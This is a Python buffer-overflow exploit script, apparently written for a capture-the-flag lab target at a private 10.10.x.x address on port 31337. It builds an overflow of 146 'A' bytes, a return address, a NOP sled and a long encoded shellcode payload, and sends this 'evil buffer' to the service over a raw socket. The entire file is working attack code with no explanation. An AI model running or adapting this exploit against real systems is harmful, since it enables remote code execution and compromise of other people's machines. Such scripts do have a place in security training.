import socket
ip = "10.10.191.129"
port = 31337
offset = 146
overflow = "A" * offset
retn = "\xc3\x14\x04\x08"
padding = "\x90" * 16
payload = ("\xd9\xeb\xba\xbf\x16\x51\xab\xd9\x74\x24\xf4\x58\x33\xc9"
"\xb1\x5e\x31\x50\x1a\x83\xc0\x04\x03\x50\x16\xe2\x4a\xea"
"\xb9\x24\xb4\x13\x3a\x5b\x3d\xf6\x0b\x49\x59\x72\x39\x5d"
"\x2a\xd6\xb2\x16\x7e\xc3\x41\x5a\x56\xe4\xe2\xd1\x80\xcb"
"\xf3\xd7\x0c\x87\x30\x79\xf0\xda\x64\x59\xc9\x14\x79\x98"
"\x0e\xe3\xf7\x75\xc2\x7f\xa5\x99\x69\x3d\x76\xcd\x6c\x12"
"\x0d\xb1\x16\x17\xd2\x46\xaa\x16\x03\xf6\xb9\x51\xbb\x7c"
"\xe5\x41\xba\x51\x90\x4b\xc8\x69\xab\xb4\x78\x19\xff\xc1"
"\x7a\xcb\xce\x15\xbd\x3c\x3d\x3a\x3f\x04\x05\xa2\x35\x7e"
"\x76\x5f\x4e\x45\x05\xbb\xdb\x5a\xad\x48\x7b\xbf\x4c\x9c"
"\x1a\x34\x42\x69\x68\x12\x46\x6c\xbd\x28\x72\xe5\x40\xff"
"\xf3\xbd\x66\xdb\x58\x65\x06\x7a\x04\xc8\x37\x9c\xe0\xb5"
"\x9d\xd6\x02\xa3\xa2\x16\xdd\xcc\xfe\x80\x12\x01\x01\x51"
"\x3c\x12\x72\x63\xe3\x88\x1c\xcf\x6c\x17\xda\x46\x7a\xa8"
"\x34\xe0\xea\x56\xb5\x11\x23\x9d\xe1\x41\x5b\x34\x8a\x09"
"\x9b\xb9\x5f\xa7\x91\x2d\x6a\x29\xa6\xdd\x02\x4b\xa8\x0c"
"\x8f\xc2\x4e\x7e\x7f\x85\xde\x3f\x2f\x65\x8e\xd7\x25\x6a"
"\xf1\xc8\x45\xa0\x9a\x63\xaa\x1d\xf3\x1b\x53\x04\x8f\xba"
"\x9c\x92\xea\xfd\x17\x17\x0b\xb3\xdf\x52\x1f\xa4\x87\x9c"
"\xdf\x35\x22\x9d\xb5\x31\xe4\xca\x21\x38\xd1\x3d\xee\xc3"
"\x34\x3e\xe8\x3c\xc9\x77\x83\x0b\x5f\x38\xfb\x73\x8f\xb8"
"\xfb\x25\xc5\xb8\x93\x91\xbd\xea\x86\xdd\x6b\x9f\x1b\x48"
"\x94\xf6\xc8\xdb\xfc\xf4\x37\x2b\xa3\x07\x12\x2f\xa4\xf8"
"\xe1\x18\x0d\x91\x19\x19\xad\x61\x73\x99\xfd\x09\x88\xb6"
"\xf2\xf9\x71\x1d\x5b\x92\xf8\xf0\x29\x03\xfd\xd8\xec\x9d"
"\xfe\xef\x34\x2d\x85\x80\xcb\xce\x7a\x89\xaf\xce\x7b\xb5"
"\xd1\xf3\xaa\x8c\xa7\x32\x6f\xab\xa8\xa8\x45\xc6\x40\x75"
"\x0c\x6b\x0d\x86\xfb\xa8\x28\x05\x09\x51\xcf\x15\x78\x54"
"\x8b\x91\x91\x24\x84\x77\x95\x9b\xa5\x5d")
postfix = ""
buffer = overflow + retn + padding + payload + postfix
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
